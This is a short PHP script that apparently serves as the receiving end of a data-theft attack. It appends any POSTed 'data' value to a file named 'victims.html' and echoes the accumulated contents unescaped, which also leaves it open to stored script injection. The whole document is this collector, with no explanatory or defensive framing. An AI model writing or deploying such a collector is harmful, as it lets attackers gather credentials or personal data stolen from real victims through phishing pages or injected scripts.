<?php

 $filename="victims.html";

 file_put_contents($filename,$_POST["data"]."<br />",FILE_APPEND);

 $msg=file_get_contents($filename);

 echo $msg; ?>
